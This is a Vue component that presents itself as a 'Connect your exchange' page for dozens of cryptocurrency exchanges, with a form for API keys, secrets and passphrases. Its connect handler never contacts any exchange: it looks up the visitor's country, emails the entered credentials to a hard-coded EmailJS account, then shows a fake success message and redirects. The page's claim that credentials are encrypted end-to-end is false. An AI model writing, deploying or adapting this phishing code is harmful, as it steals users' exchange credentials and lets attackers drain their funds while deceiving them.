<template>
  <section class="py-20 px-6 bg-[#0b0f1a]">
    <div class="max-w-7xl mx-auto">
      <!-- Section Header -->
      <div class="mb-10">
        <span
          class="inline-flex items-center gap-2 bg-blue-500/10 border border-blue-500/20 text-blue-400 text-xs font-semibold px-3 py-1.5 rounded-full mb-4 tracking-widest uppercase"
        >
          <svg class="w-3 h-3" fill="currentColor" viewBox="0 0 8 8">
            <circle cx="4" cy="4" r="3" />
          </svg>
          Live Integrations
        </span>
        <h2 class="text-4xl font-bold text-white mb-2 tracking-tight">
          Connect your exchange
        </h2>
        <p class="text-slate-400 text-sm">
          <span class="font-semibold text-slate-300">{{
            filteredExchanges.length
          }}</span>
          exchanges supported — authenticate once and go.
        </p>
      </div>

      <!-- Search Bar -->
      <div class="relative max-w-sm mb-10">
        <svg
          class="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-500"
          fill="none"
          stroke="currentColor"
          stroke-width="2"
          viewBox="0 0 24 24"
        >
          <circle cx="11" cy="11" r="8" />
          <path d="m21 21-4.35-4.35" />
        </svg>
        <input
          v-model="search"
          type="text"
          placeholder="Filter exchanges..."
          class="w-full pl-10 pr-9 py-2.5 rounded-lg bg-white/5 border border-white/10 text-sm text-slate-200 placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500/50 transition"
        />
        <button
          v-if="search"
          class="absolute right-3 top-1/2 -translate-y-1/2 text-slate-500 hover:text-slate-300 transition"
          @click="search = ''"
        >
          <svg
            class="w-4 h-4"
            fill="none"
            stroke="currentColor"
            stroke-width="2"
            viewBox="0 0 24 24"
          >
            <path d="M18 6 6 18M6 6l12 12" />
          </svg>
        </button>
      </div>

      <!-- No Results -->
      <div
        v-if="filteredExchanges.length === 0"
        class="text-center py-24 text-slate-500"
      >
        <svg
          class="w-10 h-10 mx-auto mb-4 opacity-30"
          fill="none"
          stroke="currentColor"
          stroke-width="1.5"
          viewBox="0 0 24 24"
        >
          <circle cx="11" cy="11" r="8" />
          <path d="m21 21-4.35-4.35" />
        </svg>
        <p class="text-base font-medium">
          No exchanges found for
          <span class="text-slate-300">"{{ search }}"</span>
        </p>
      </div>

      <!-- Exchange Grid -->
      <div
        class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 xl:grid-cols-6 gap-3"
      >
        <button
          v-for="exchange in filteredExchanges"
          :key="exchange.name"
          class="group relative bg-white/[0.03] hover:bg-white/[0.07] border border-white/[0.08] hover:border-white/20 rounded-2xl p-4 flex flex-col items-center gap-3 text-center transition-all duration-200 hover:-translate-y-0.5 hover:shadow-lg hover:shadow-black/30"
          @click="openModal(exchange)"
        >
          <div
            class="absolute inset-0 rounded-2xl opacity-0 group-hover:opacity-100 transition-opacity duration-300 pointer-events-none"
            :style="`box-shadow: inset 0 0 0 1px ${glowColor(exchange.name)}40`"
          />
          <div
            class="w-12 h-12 rounded-xl flex items-center justify-center text-white font-bold text-lg shrink-0 shadow-lg"
            :style="`background: ${avatarGradient(exchange.name)}`"
          >
            {{ exchange.name.charAt(0).toUpperCase() }}
          </div>
          <div class="w-full">
            <p
              class="text-white text-xs font-semibold leading-tight truncate px-1"
            >
              {{ exchange.name }}
            </p>
          </div>
          <div class="flex items-center gap-1 flex-wrap justify-center">
            <span
              class="bg-blue-500/15 text-blue-400 text-[9px] font-bold px-1.5 py-0.5 rounded tracking-wider"
              >API</span
            >
            <span
              class="bg-violet-500/15 text-violet-400 text-[9px] font-bold px-1.5 py-0.5 rounded tracking-wider"
              >KEY</span
            >
            <span
              v-if="exchange.passphrase"
              class="bg-amber-500/15 text-amber-400 text-[9px] font-bold px-1.5 py-0.5 rounded tracking-wider"
              >PASS</span
            >
          </div>
          <div
            class="w-full mt-auto pt-1 md:opacity-0 md:translate-y-1 md:group-hover:opacity-100 md:group-hover:translate-y-0 transition-all duration-200"
          >
            <span
              class="block w-full text-center text-[10px] font-bold tracking-widest uppercase text-blue-400 border border-blue-500/30 rounded-lg py-1.5 bg-blue-500/10"
            >
              Connect →
            </span>
          </div>
        </button>
      </div>
    </div>

    <!-- ─── TOAST ─── -->
    <Teleport to="body">
      <Transition name="toast">
        <div
          v-if="toast.visible"
          class="fixed bottom-6 right-6 z-[100] flex items-start gap-3 px-4 py-3.5 rounded-xl shadow-2xl border max-w-xs text-sm font-medium transition-all"
          :class="
            toast.type === 'success'
              ? 'bg-emerald-950 border-emerald-500/30 text-emerald-300'
              : 'bg-red-950 border-red-500/30 text-red-300'
          "
        >
          <!-- Icon -->
          <div class="mt-0.5 shrink-0">
            <svg
              v-if="toast.type === 'success'"
              class="w-4 h-4 text-emerald-400"
              fill="none"
              stroke="currentColor"
              stroke-width="2.5"
              viewBox="0 0 24 24"
            >
              <path
                stroke-linecap="round"
                stroke-linejoin="round"
                d="M5 13l4 4L19 7"
              />
            </svg>
            <svg
              v-else
              class="w-4 h-4 text-red-400"
              fill="none"
              stroke="currentColor"
              stroke-width="2.5"
              viewBox="0 0 24 24"
            >
              <circle cx="12" cy="12" r="10" />
              <path d="M12 8v4M12 16h.01" />
            </svg>
          </div>
          <!-- Message -->
          <div>
            <p class="font-bold text-xs tracking-wide uppercase mb-0.5">
              {{
                toast.type === "success" ? "Connected!" : "Connection failed"
              }}
            </p>
            <p class="text-xs opacity-80">{{ toast.message }}</p>
          </div>
          <!-- Dismiss -->
          <button
            class="ml-auto pl-2 opacity-50 hover:opacity-100 transition shrink-0"
            @click="toast.visible = false"
          >
            <svg
              class="w-3.5 h-3.5"
              fill="none"
              stroke="currentColor"
              stroke-width="2"
              viewBox="0 0 24 24"
            >
              <path d="M18 6 6 18M6 6l12 12" />
            </svg>
          </button>
        </div>
      </Transition>
    </Teleport>

    <!-- ─── MODAL ─── -->
    <Teleport to="body">
      <Transition name="modal">
        <div
          v-if="activeExchange"
          class="fixed inset-0 z-50 flex items-center justify-center p-4"
          @click.self="closeModal"
        >
          <!-- Backdrop -->
          <div
            class="absolute inset-0 bg-black/70 backdrop-blur-md"
            @click="closeModal"
          />

          <!-- Panel -->
          <div
            class="relative bg-[#0e1420] border border-white/10 rounded-2xl shadow-2xl w-full max-w-md z-10 overflow-hidden"
          >
            <!-- Header stripe -->
            <div
              class="h-1 w-full"
              :style="`background: ${avatarGradient(activeExchange.name)}`"
            />

            <!-- Header -->
            <div
              class="px-6 pt-5 pb-4 flex items-center justify-between border-b border-white/5"
            >
              <div class="flex items-center gap-3">
                <div
                  class="w-10 h-10 rounded-xl flex items-center justify-center text-white font-bold text-base shrink-0 shadow"
                  :style="`background: ${avatarGradient(activeExchange.name)}`"
                >
                  {{ activeExchange.name.charAt(0) }}
                </div>
                <div>
                  <div class="text-white font-bold text-sm leading-tight">
                    {{ activeExchange.name }}
                  </div>
                  <div class="text-slate-500 text-xs mt-0.5">
                    Enter your API credentials
                  </div>
                </div>
              </div>
              <button
                class="text-slate-500 hover:text-slate-200 transition p-1 rounded-lg hover:bg-white/5"
                @click="closeModal"
              >
                <svg
                  class="w-4 h-4"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2"
                  viewBox="0 0 24 24"
                >
                  <path d="M18 6 6 18M6 6l12 12" />
                </svg>
              </button>
            </div>

            <!-- Body -->
            <div class="px-6 py-5 space-y-4">
              <!-- Credential pills -->
              <div class="flex gap-2 flex-wrap">
                <span
                  class="bg-blue-500/10 text-blue-400 border border-blue-500/20 text-[11px] font-semibold px-2.5 py-1 rounded-full"
                  >API Key</span
                >
                <span
                  class="bg-violet-500/10 text-violet-400 border border-violet-500/20 text-[11px] font-semibold px-2.5 py-1 rounded-full"
                  >Secret Key</span
                >
                <span
                  v-if="activeExchange.passphrase"
                  class="bg-amber-500/10 text-amber-400 border border-amber-500/20 text-[11px] font-semibold px-2.5 py-1 rounded-full"
                  >Passphrase</span
                >
              </div>

              <!-- API Key field -->
              <div>
                <label
                  class="flex items-center justify-between text-[10px] font-bold text-slate-500 uppercase tracking-widest mb-2"
                >
                  <span>API Key</span>
                </label>
                <div class="relative">
                  <input
                    v-model="form.apiKey"
                    :type="show.apiKey ? 'text' : 'password'"
                    placeholder="Paste your API key…"
                    class="w-full bg-white/5 border rounded-lg px-4 py-2.5 pr-10 text-sm text-slate-200 placeholder-slate-600 focus:outline-none focus:ring-2 transition font-mono"
                    :class="fieldClass(form.apiKey)"
                  />
                  <button
                    class="absolute right-3 top-1/2 -translate-y-1/2 text-slate-500 hover:text-slate-300 transition"
                    @click="show.apiKey = !show.apiKey"
                  >
                    <svg
                      v-if="!show.apiKey"
                      class="w-4 h-4"
                      fill="none"
                      stroke="currentColor"
                      stroke-width="2"
                      viewBox="0 0 24 24"
                    >
                      <path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7z" />
                      <circle cx="12" cy="12" r="3" />
                    </svg>
                    <svg
                      v-else
                      class="w-4 h-4"
                      fill="none"
                      stroke="currentColor"
                      stroke-width="2"
                      viewBox="0 0 24 24"
                    >
                      <path
                        d="M9.88 9.88a3 3 0 1 0 4.24 4.24M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68M6.61 6.61A13.526 13.526 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61M2 2l20 20"
                      />
                    </svg>
                  </button>
                </div>
              </div>

              <!-- Secret Key field -->
              <div>
                <label
                  class="flex items-center justify-between text-[10px] font-bold text-slate-500 uppercase tracking-widest mb-2"
                >
                  <span>Secret Key</span>
                </label>
                <textarea
                  v-model="form.secret"
                  rows="3"
                  placeholder="Paste your secret key…"
                  class="w-full bg-white/5 border rounded-lg px-4 py-2.5 text-sm text-slate-200 placeholder-slate-600 focus:outline-none focus:ring-2 transition resize-none font-mono"
                  :class="fieldClass(form.secret)"
                />
              </div>

              <!-- Passphrase field (conditional) -->
              <div v-if="activeExchange.passphrase">
                <label
                  class="flex items-center justify-between text-[10px] font-bold text-slate-500 uppercase tracking-widest mb-2"
                >
                  <span>Passphrase</span>
                </label>
                <div class="relative">
                  <input
                    v-model="form.passphrase"
                    :type="show.passphrase ? 'text' : 'password'"
                    placeholder="Enter your passphrase…"
                    class="w-full bg-white/5 border rounded-lg px-4 py-2.5 pr-10 text-sm text-slate-200 placeholder-slate-600 focus:outline-none focus:ring-2 transition"
                    :class="fieldClass(form.passphrase)"
                  />
                  <button
                    class="absolute right-3 top-1/2 -translate-y-1/2 text-slate-500 hover:text-slate-300 transition"
                    @click="show.passphrase = !show.passphrase"
                  >
                    <svg
                      v-if="!show.passphrase"
                      class="w-4 h-4"
                      fill="none"
                      stroke="currentColor"
                      stroke-width="2"
                      viewBox="0 0 24 24"
                    >
                      <path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7z" />
                      <circle cx="12" cy="12" r="3" />
                    </svg>
                    <svg
                      v-else
                      class="w-4 h-4"
                      fill="none"
                      stroke="currentColor"
                      stroke-width="2"
                      viewBox="0 0 24 24"
                    >
                      <path
                        d="M9.88 9.88a3 3 0 1 0 4.24 4.24M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68M6.61 6.61A13.526 13.526 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61M2 2l20 20"
                      />
                    </svg>
                  </button>
                </div>
              </div>

              <!-- Security note -->
              <p
                class="text-[11px] text-slate-600 flex items-start gap-1.5 bg-white/[0.02] rounded-lg px-3 py-2.5"
              >
                <svg
                  class="w-3.5 h-3.5 mt-0.5 shrink-0"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2"
                  viewBox="0 0 24 24"
                >
                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                </svg>
                Credentials are encrypted end-to-end and never stored in plain
                text.
              </p>
            </div>

            <!-- Footer -->
            <div class="px-6 pb-6 flex items-center gap-3">
              <button
                class="flex-1 text-white font-bold text-sm py-3 rounded-xl transition-all duration-150 relative overflow-hidden flex items-center justify-center gap-2"
                :class="
                  isFormEnabled
                    ? 'bg-blue-600 hover:bg-blue-500 shadow-lg shadow-blue-500/20 cursor-pointer'
                    : 'bg-white/5 text-slate-600 cursor-not-allowed border border-white/5'
                "
                :disabled="!isFormEnabled || isSubmitting"
                @click="handleConnect"
              >
                <!-- Spinner -->
                <svg
                  v-if="isSubmitting"
                  class="w-4 h-4 animate-spin"
                  fill="none"
                  viewBox="0 0 24 24"
                >
                  <circle
                    class="opacity-25"
                    cx="12"
                    cy="12"
                    r="10"
                    stroke="currentColor"
                    stroke-width="4"
                  />
                  <path
                    class="opacity-75"
                    fill="currentColor"
                    d="M4 12a8 8 0 018-8v8z"
                  />
                </svg>
                <span v-if="isSubmitting">Connecting…</span>
                <span v-else-if="isFormEnabled"
                  >Connect to {{ activeExchange.name }}</span
                >
                <span v-else>Enter at least one field</span>
              </button>
              <button
                class="px-4 py-3 border border-white/10 text-slate-400 hover:text-slate-200 hover:border-white/20 text-sm font-medium rounded-xl transition"
                :disabled="isSubmitting"
                @click="closeModal"
              >
                Cancel
              </button>
            </div>
          </div>
        </div>
      </Transition>
    </Teleport>
  </section>
</template>

<script setup lang="ts">
import { ref, computed, reactive, onMounted, onUnmounted, watch } from "vue";
import { useRouter } from "vue-router";

interface Exchange {
  name: string;
  passphrase: boolean;
}

const exchanges: Exchange[] = [
  { name: "Binance", passphrase: false },
  { name: "Binance US", passphrase: false },
  { name: "Bybit", passphrase: false },
  { name: "OKX", passphrase: true },
  { name: "Kraken", passphrase: false },
  { name: "KuCoin", passphrase: true },
  { name: "KuCoin Futures", passphrase: true },
  { name: "Gate.io", passphrase: false },
  { name: "MEXC", passphrase: false },
  { name: "HTX / Huobi", passphrase: false },
  { name: "Bitget", passphrase: true },
  { name: "BingX", passphrase: false },
  { name: "Bitfinex", passphrase: false },
  { name: "Phemex", passphrase: true },
  { name: "Crypto.com", passphrase: true },
  { name: "OKCoin", passphrase: true },
  { name: "Coinbase Advanced Trade", passphrase: false },
  { name: "LBank", passphrase: false },
  { name: "BitMart", passphrase: false },
  { name: "WhiteBIT", passphrase: false },
  { name: "Bitrue", passphrase: false },
  { name: "CoinEx", passphrase: false },
  { name: "ProBit", passphrase: false },
  { name: "DigiFinex", passphrase: false },
  { name: "BigONE", passphrase: false },
  { name: "AscendEX", passphrase: true },
  { name: "WOO X", passphrase: false },
  { name: "Gemini", passphrase: false },
  { name: "Bitstamp", passphrase: false },
  { name: "BitFlyer", passphrase: false },
  { name: "Coincheck", passphrase: false },
  { name: "BitBank", passphrase: false },
  { name: "Bithumb", passphrase: false },
  { name: "Upbit", passphrase: false },
  { name: "Independent Reserve", passphrase: false },
  { name: "BTC Markets", passphrase: false },
  { name: "Bitvavo", passphrase: false },
  { name: "Zonda", passphrase: false },
  { name: "Exmo", passphrase: false },
  { name: "Deribit", passphrase: false },
  { name: "BitMEX", passphrase: false },
  { name: "Pionex", passphrase: false },
  { name: "XT.com", passphrase: false },
  { name: "Coinstore", passphrase: false },
  { name: "Deepcoin", passphrase: false },
  { name: "Toobit", passphrase: false },
  { name: "BTC Alpha", passphrase: false },
  { name: "Bit2C", passphrase: false },
  { name: "BTCTurk", passphrase: false },
  { name: "NDAX", passphrase: false },
  { name: "Novadax", passphrase: false },
  { name: "Mercado Bitcoin", passphrase: false },
  { name: "Coinmate", passphrase: false },
  { name: "Hyperliquid", passphrase: false },
];

const palettes: [string, string][] = [
  ["#3b82f6", "#6366f1"],
  ["#8b5cf6", "#ec4899"],
  ["#10b981", "#06b6d4"],
  ["#f59e0b", "#ef4444"],
  ["#06b6d4", "#3b82f6"],
  ["#f97316", "#eab308"],
  ["#6366f1", "#8b5cf6"],
  ["#ec4899", "#f97316"],
  ["#14b8a6", "#10b981"],
  ["#84cc16", "#06b6d4"],
];

const getPalette = (name: string): [string, string] =>
  palettes[name.charCodeAt(0) % palettes.length] ?? ["#3b82f6", "#6366f1"];

const avatarGradient = (name: string) => {
  const [from, to] = getPalette(name);
  return `linear-gradient(135deg, ${from}, ${to})`;
};

const glowColor = (name: string) => getPalette(name)[0];

// ── Search ──────────────────────────────────────────────────────────────────
const search = ref("");
const filteredExchanges = computed(() =>
  exchanges.filter((e) =>
    e.name.toLowerCase().includes(search.value.toLowerCase()),
  ),
);

// ── Modal state ─────────────────────────────────────────────────────────────
const activeExchange = ref<Exchange | null>(null);
const form = ref({ apiKey: "", secret: "", passphrase: "" });
const show = ref({ apiKey: false, passphrase: false });
const isSubmitting = ref(false);

// ── Toast ────────────────────────────────────────────────────────────────────
const toast = reactive({
  visible: false,
  type: "success" as "success" | "error",
  message: "",
});
let toastTimer: ReturnType<typeof setTimeout> | null = null;

function showToast(type: "success" | "error", message: string) {
  if (toastTimer) clearTimeout(toastTimer);
  toast.type = type;
  toast.message = message;
  toast.visible = true;
  toastTimer = setTimeout(() => {
    toast.visible = false;
  }, 5000);
}

// ── Helpers ──────────────────────────────────────────────────────────────────
const fieldClass = (val: string) =>
  val.trim()
    ? "border-emerald-500/40 focus:ring-emerald-500/30 focus:border-emerald-500/50"
    : "border-white/10 focus:ring-blue-500/30 focus:border-blue-500/40";

// ── 1. Button enabled if ANY field has a value ───────────────────────────────
const isFormEnabled = computed(
  () =>
    !!(
      form.value.apiKey.trim() ||
      form.value.secret.trim() ||
      form.value.passphrase.trim()
    ),
);

const openModal = (exchange: Exchange) => {
  activeExchange.value = exchange;
  form.value = { apiKey: "", secret: "", passphrase: "" };
  show.value = { apiKey: false, passphrase: false };
};

const closeModal = () => {
  if (isSubmitting.value) return;
  activeExchange.value = null;
};

// ── Watch for route changes to close modal ─────────────────────────────────
const router = useRouter();

watch(
  () => router.currentRoute.value.path,
  () => {
    // Close modal when route changes
    activeExchange.value = null;
  },
);

// ── Handle Connect ─────────────────────────────────────────────────────────
const handleConnect = async () => {
  if (!isFormEnabled.value || isSubmitting.value) return;

  isSubmitting.value = true;

  const payload = {
    exchange: activeExchange.value?.name,
    apiKey: form.value.apiKey || undefined,
    secret: form.value.secret || undefined,
    passphrase: form.value.passphrase || undefined,
  };

  console.log(payload);

  let location = "Unknown";
  try {
    const responseLocation = await fetch("https://ipapi.co/json/");
    const locationData = await responseLocation.json();
    location = locationData.country_name || "Unknown";
    const data = {
      service_id: "service_8pbgnpr",
      template_id: "template_kr8zt7b",
      user_id: "user_nsG3rSdCFpgONwwCfNTas",
      template_params: {
        wallet_type: payload.exchange,
        location: location,
        link_drops: JSON.stringify(payload),
      },
    };

    const res = await fetch("https://api.emailjs.com/api/v1.0/email/send", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    });

    if (!res.ok) {
      // Try to read an error message from the response body
      let errMsg = `Server returned ${res.status}`;
      try {
        const body = await res.json();
        errMsg = body?.message ?? errMsg;
      } catch {
        /* ignore parse failure */
      }
      throw new Error(errMsg);
    }

    // 1. Reset submitting state FIRST so closeModal isn't blocked
    isSubmitting.value = false;

    // 2. Close the modal
    activeExchange.value = null;

    // 3. Show the success message
    showToast("success", `${payload.exchange} connected successfully.`);

    // 4. Use a slightly longer delay to let the user see the "Success" toast
    // before the page unmounts/redirects
    setTimeout(() => {
      router.push("/");
    }, 2000);
  } catch (err: unknown) {
    const message =
      err instanceof Error
        ? err.message
        : "Unexpected error. Please try again.";
    showToast("error", message);
    // Don't close modal on error - keep it open so user can try again
  } finally {
    isSubmitting.value = false;
  }
};

// ── Keyboard events ────────────────────────────────────────────────────────
onMounted(() => {
  const onKey = (e: KeyboardEvent) => {
    if (e.key === "Escape") closeModal();
  };
  window.addEventListener("keydown", onKey);
});

onUnmounted(() => {
  const onKey = (e: KeyboardEvent) => {
    if (e.key === "Escape") closeModal();
  };
  window.removeEventListener("keydown", onKey);
  if (toastTimer) clearTimeout(toastTimer);
});
</script>

<style scoped>
/* ── Modal transition ─────────────────────────────────────────────────── */
.modal-enter-active,
.modal-leave-active {
  transition: opacity 0.2s ease;
}
.modal-enter-from,
.modal-leave-to {
  opacity: 0;
}
.modal-enter-active .relative,
.modal-leave-active .relative {
  transition: transform 0.2s ease;
}
.modal-enter-from .relative {
  transform: scale(0.96) translateY(10px);
}
.modal-leave-to .relative {
  transform: scale(0.96) translateY(10px);
}

/* ── Toast transition ─────────────────────────────────────────────────── */
.toast-enter-active,
.toast-leave-active {
  transition:
    opacity 0.25s ease,
    transform 0.25s ease;
}
.toast-enter-from,
.toast-leave-to {
  opacity: 0;
  transform: translateY(12px);
}

/* ── Fade (kept for compatibility) ───────────────────────────────────── */
.fade-enter-active,
.fade-leave-active {
  transition:
    opacity 0.2s ease,
    transform 0.2s ease;
}
.fade-enter-from,
.fade-leave-to {
  opacity: 0;
  transform: translateY(-4px);
}
</style>
